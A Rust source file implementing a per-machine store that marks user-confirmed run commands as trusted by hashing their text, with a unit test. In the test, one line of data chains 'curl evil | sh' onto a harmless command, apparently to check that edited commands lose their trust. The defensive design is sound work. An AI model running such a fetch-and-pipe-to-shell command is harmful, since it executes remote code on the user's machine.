//! `app_meta` key/value rows — per-install state that never syncs.

use sha2::{Digest, Sha256};

use super::error::StoreError;
use super::pool::Db;

const TRUSTED_PREFIX: &str = "trusted_command:";

#[derive(Clone)]
pub struct AppMetaRepo {
    db: Db,
}

impl AppMetaRepo {
    pub fn new(db: Db) -> Self {
        Self { db }
    }

    pub async fn get(&self, key: &str) -> Result<Option<String>, StoreError> {
        Ok(sqlx::query_scalar("SELECT value FROM app_meta WHERE key = ?")
            .bind(key)
            .fetch_optional(&self.db)
            .await?)
    }

    pub async fn set(&self, key: &str, value: &str) -> Result<(), StoreError> {
        sqlx::query("INSERT OR REPLACE INTO app_meta (key, value) VALUES (?, ?)")
            .bind(key)
            .bind(value)
            .execute(&self.db)
            .await?;
        Ok(())
    }

    pub async fn delete(&self, key: &str) -> Result<(), StoreError> {
        sqlx::query("DELETE FROM app_meta WHERE key = ?")
            .bind(key)
            .execute(&self.db)
            .await?;
        Ok(())
    }

    /// Record that the user created/edited/confirmed this exact command
    /// text on this machine, so it may start on its own here.
    ///
    /// Why a per-machine hash and not a column: run commands sync, so a
    /// command written on another machine (or by anything with access to
    /// the cloud row) would otherwise execute here unattended the next time
    /// a task starts. Keyed by the text's hash, an edit anywhere changes the
    /// hash and needs confirming again; `app_meta` never leaves the machine.
    pub async fn trust_command(&self, command: &str) -> Result<(), StoreError> {
        self.set(&trusted_key(command), &chrono::Utc::now().to_rfc3339()).await
    }

    pub async fn is_command_trusted(&self, command: &str) -> Result<bool, StoreError> {
        Ok(self.get(&trusted_key(command)).await?.is_some())
    }
}

fn trusted_key(command: &str) -> String {
    let digest = Sha256::digest(command.trim().as_bytes());
    let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
    format!("{TRUSTED_PREFIX}{hex}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::init_pool;

    #[tokio::test]
    async fn trust_is_per_exact_command_text() {
        let dir = tempfile::tempdir().unwrap();
        let repo = AppMetaRepo::new(init_pool(&dir.path().join("t.sqlite")).await.unwrap());
        assert!(!repo.is_command_trusted("pnpm test").await.unwrap());
        repo.trust_command("pnpm test").await.unwrap();
        assert!(repo.is_command_trusted("pnpm test").await.unwrap());
        // Surrounding whitespace isn't a different command…
        assert!(repo.is_command_trusted("  pnpm test\n").await.unwrap());
        // …but any real edit is.
        assert!(!repo.is_command_trusted("pnpm test; curl evil | sh").await.unwrap());
    }
}
